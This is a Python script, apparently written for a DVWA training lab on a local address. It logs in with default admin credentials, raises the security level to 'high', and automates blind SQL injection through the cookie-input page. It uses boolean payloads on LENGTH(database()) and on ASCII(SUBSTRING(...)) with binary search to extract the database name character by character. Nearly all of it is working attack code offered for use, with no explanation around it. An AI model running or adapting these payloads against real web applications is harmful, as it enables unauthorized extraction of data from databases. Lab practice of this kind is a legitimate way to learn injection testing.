import requests
import math

session = requests.Session()


def Login():
    urlLogin = "http://192.168.1.104:8080/login.php"
    response = session.get(urlLogin).text
    target = "name='user_token' value='"
    index = response.find(target)
    start = index + len(target)
    end = start + 32
    token = response[start:end]
    data_form = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token,
    }
    response = session.post(urlLogin, data=data_form)


Login()


def changeSecurityLevel(level):
    urlSecurity = "http://192.168.1.104:8080/security.php"
    response = session.get(urlSecurity).text
    target = "name='user_token' value='"
    index = response.find(target)
    start = index + len(target)
    end = start + 32
    token = response[start:end]
    data_form = {
        "security": level,
        "seclev_submit": "Submit",
        "user_token": token,
    }
    session.post(urlSecurity, data=data_form)


changeSecurityLevel("high")


def binSearch(left, right):
    return int((left + right) / 2)


def sqlBlindInjection():
    count = 1
    length = 0
    urlPopup = "http://192.168.1.104:8080/vulnerabilities/sqli_blind/cookie-input.php"
    urlSQLi = "http://192.168.1.104:8080/vulnerabilities/sqli_blind/"
    # Doan chieu dai ten database
    for i in range(1, 20):
        params = {"id": f"1' AND LENGTH(database())={i}-- ", "Submit": "Submit"}
        session.post(urlPopup, data=params)
        response = session.get(urlSQLi)
        if response.text.find("User ID exists in the database") != -1:
            length = i
            break
    print(length)

    for pos in range(1, length + 1):
        left = 97
        right = 122
        while True:
            mid = binSearch(left, right)
            params = {
                "id": f"1' AND ASCII(SUBSTRING(database(),{pos},1))<{mid}-- ",
                "Submit": "Submit",
            }

            session.post(urlPopup, data=params)
            response1 = session.get(urlSQLi)
            params = {
                "id": f"1' AND ASCII(SUBSTRING(database(),{pos},1))>{mid}-- ",
                "Submit": "Submit",
            }

            session.post(urlPopup, data=params)

            response2 = session.get(urlSQLi)
            if response1.text.find("User ID exists in the database") != -1:
                right = mid - 1

            elif response2.text.find("User ID exists in the database") != -1:
                left = mid + 1
            else:
                print(chr(mid))
                break


sqlBlindInjection()
